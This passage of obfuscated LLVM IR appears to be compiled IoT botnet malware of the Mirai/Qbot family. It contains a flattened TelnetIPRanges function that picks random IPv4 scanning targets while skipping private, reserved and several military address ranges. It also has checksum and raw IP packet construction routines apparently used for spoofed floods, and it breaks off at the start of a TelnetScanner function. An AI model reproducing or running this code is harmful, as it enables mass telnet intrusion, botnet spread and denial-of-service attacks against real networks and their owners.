  store i32 -1624350908, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1624350908, label %14
    i32 -164863447, label %19
    i32 -1485087083, label %24
    i32 -766094343, label %29
    i32 -1865381099, label %34
    i32 -612181162, label %39
    i32 709068356, label %44
    i32 696358929, label %49
    i32 -1092098970, label %54
    i32 -87794159, label %59
    i32 1379684750, label %64
    i32 -509607198, label %69
    i32 -2111019022, label %74
    i32 692975656, label %79
    i32 886446242, label %84
    i32 119900325, label %89
    i32 1583105322, label %94
    i32 495414421, label %99
    i32 -2028095167, label %104
    i32 -360122337, label %109
    i32 -428599100, label %114
    i32 -763613758, label %119
    i32 1060001070, label %124
    i32 -100021896, label %129
    i32 1814447929, label %134
    i32 1001467783, label %139
    i32 1718289666, label %144
    i32 -6965242, label %149
    i32 -767975401, label %154
    i32 -982606031, label %159
    i32 244808369, label %164
    i32 1122315845, label %169
    i32 -718841827, label %174
    i32 -1934952779, label %179
    i32 1565693276, label %183
    i32 -1597902320, label %184
    i32 238890833, label %186
    i32 -515750794, label %199
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  %18 = select i1 %17, i32 -1597902320, i32 -164863447
  store i32 %18, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 0
  %23 = select i1 %22, i32 -1597902320, i32 -1485087083
  store i32 %23, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 3
  %28 = select i1 %27, i32 -1597902320, i32 -766094343
  store i32 %28, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 15
  %33 = select i1 %32, i32 -1597902320, i32 -1865381099
  store i32 %33, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 16
  %38 = select i1 %37, i32 -1597902320, i32 -612181162
  store i32 %38, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 56
  %43 = select i1 %42, i32 -1597902320, i32 709068356
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 10
  %48 = select i1 %47, i32 -1597902320, i32 696358929
  store i32 %48, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 192
  %53 = select i1 %52, i32 -1092098970, i32 -87794159
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 168
  %58 = select i1 %57, i32 -1597902320, i32 -87794159
  store i32 %58, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 172
  %63 = select i1 %62, i32 1379684750, i32 -2111019022
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp sge i32 %66, 16
  %68 = select i1 %67, i32 -509607198, i32 -2111019022
  store i32 %68, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %71, 32
  %73 = select i1 %72, i32 -1597902320, i32 -2111019022
  store i32 %73, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 100
  %78 = select i1 %77, i32 692975656, i32 119900325
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp sge i32 %81, 64
  %83 = select i1 %82, i32 886446242, i32 119900325
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp slt i32 %86, 127
  %88 = select i1 %87, i32 -1597902320, i32 119900325
  store i32 %88, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %91 = zext i8 %90 to i32
  %92 = icmp eq i32 %91, 169
  %93 = select i1 %92, i32 1583105322, i32 495414421
  store i32 %93, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp sgt i32 %96, 254
  %98 = select i1 %97, i32 -1597902320, i32 495414421
  store i32 %98, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 198
  %103 = select i1 %102, i32 -2028095167, i32 -428599100
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp sge i32 %106, 18
  %108 = select i1 %107, i32 -360122337, i32 -428599100
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %111, 20
  %113 = select i1 %112, i32 -1597902320, i32 -428599100
  store i32 %113, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 224
  %118 = select i1 %117, i32 -1597902320, i32 -763613758
  store i32 %118, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 6
  %123 = select i1 %122, i32 1565693276, i32 1060001070
  store i32 %123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 7
  %128 = select i1 %127, i32 1565693276, i32 -100021896
  store i32 %128, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 11
  %133 = select i1 %132, i32 1565693276, i32 1814447929
  store i32 %133, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 21
  %138 = select i1 %137, i32 1565693276, i32 1001467783
  store i32 %138, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 22
  %143 = select i1 %142, i32 1565693276, i32 1718289666
  store i32 %143, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 26
  %148 = select i1 %147, i32 1565693276, i32 -6965242
  store i32 %148, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %151 = zext i8 %150 to i32
  %152 = icmp eq i32 %151, 28
  %153 = select i1 %152, i32 1565693276, i32 -767975401
  store i32 %153, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 29
  %158 = select i1 %157, i32 1565693276, i32 -982606031
  store i32 %158, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 30
  %163 = select i1 %162, i32 1565693276, i32 244808369
  store i32 %163, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %166 = zext i8 %165 to i32
  %167 = icmp eq i32 %166, 33
  %168 = select i1 %167, i32 1565693276, i32 1122315845
  store i32 %168, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 55
  %173 = select i1 %172, i32 1565693276, i32 -718841827
  store i32 %173, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 214
  %178 = select i1 %177, i32 1565693276, i32 -1934952779
  store i32 %178, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 215
  store i32 1565693276, i32* %switchVar
  store i1 %182, i1* %.reg2mem
  br label %loopEnd

; <label>:183:                                    ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 -1597902320, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %185 = select i1 %.reload3, i32 238890833, i32 -515750794
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = call i32 @rand() #5
  %188 = srem i32 %187, 223
  %189 = trunc i32 %188 to i8
  store i8 %189, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %190 = call i32 @rand() #5
  %191 = srem i32 %190, 255
  %192 = trunc i32 %191 to i8
  store i8 %192, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %193 = call i32 @rand() #5
  %194 = srem i32 %193, 255
  %195 = trunc i32 %194 to i8
  store i8 %195, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %196 = call i32 @rand() #5
  %197 = srem i32 %196, 255
  %198 = trunc i32 %197 to i8
  store i8 %198, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  store i32 -1624350908, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  %200 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %200, i8 0, i64 16, i32 16, i1 false)
  %201 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %202 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 0), align 1
  %203 = zext i8 %202 to i32
  %204 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 1), align 1
  %205 = zext i8 %204 to i32
  %206 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 2), align 1
  %207 = zext i8 %206 to i32
  %208 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @TelnetIPRanges.ipState, i64 0, i64 3), align 1
  %209 = zext i8 %208 to i32
  %210 = call i32 (i8*, i8*, ...) @szprintf(i8* %201, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.114, i32 0, i32 0), i32 %203, i32 %205, i32 %207, i32 %209)
  %211 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %212 = call i32 @inet_addr(i8* %211) #5
  ret i32 %212

loopEnd:                                          ; preds = %186, %184, %183, %179, %174, %169, %164, %159, %154, %149, %144, %139, %134, %129, %124, %119, %114, %109, %104, %99, %94, %89, %84, %79, %74, %69, %64, %59, %54, %49, %44, %39, %34, %29, %24, %19, %14, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -264661605, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -264661605, label %6
    i32 1803120590, label %10
    i32 1886684260, label %19
    i32 1684855074, label %23
    i32 248366273, label %30
    i32 131366397, label %31
    i32 1564168499, label %36
    i32 1032792518, label %42
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  %9 = select i1 %8, i32 1803120590, i32 1886684260
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sub nsw i32 %17, 2
  store i32 %18, i32* %4, align 4
  store i32 -264661605, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = icmp sgt i32 %20, 0
  %22 = select i1 %21, i32 1684855074, i32 248366273
  store i32 %22, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i16*, i16** %3, align 8
  %25 = bitcast i16* %24 to i8*
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i64
  %28 = load i64, i64* %5, align 8
  %29 = add i64 %28, %27
  store i64 %29, i64* %5, align 8
  store i32 248366273, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  store i32 131366397, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = icmp ne i64 %33, 0
  %35 = select i1 %34, i32 1564168499, i32 1032792518
  store i32 %35, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i64, i64* %5, align 8
  %38 = and i64 %37, 65535
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = add i64 %38, %40
  store i64 %41, i64* %5, align 8
  store i32 131366397, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = trunc i64 %44 to i16
  ret i16 %45

loopEnd:                                          ; preds = %36, %31, %30, %23, %19, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  store i32 %4, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1982100115, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1982100115, label %first
    i32 -652270170, label %7
    i32 1674309030, label %8
    i32 -1018324078, label %11
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %5 = icmp sgt i32 3, %.reload
  %6 = select i1 %5, i32 -652270170, i32 1674309030
  store i32 %6, i32* %switchVar
  br label %loopEnd

; <label>:7:                                      ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -1018324078, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* %2, align 4
  store i32 -1018324078, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %2, align 4
  ret i32 %12

loopEnd:                                          ; preds = %8, %7, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %.reg2mem132 = alloca i32
  %.reg2mem20 = alloca %struct.telstate_t*
  %.reg2mem18 = alloca i32
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
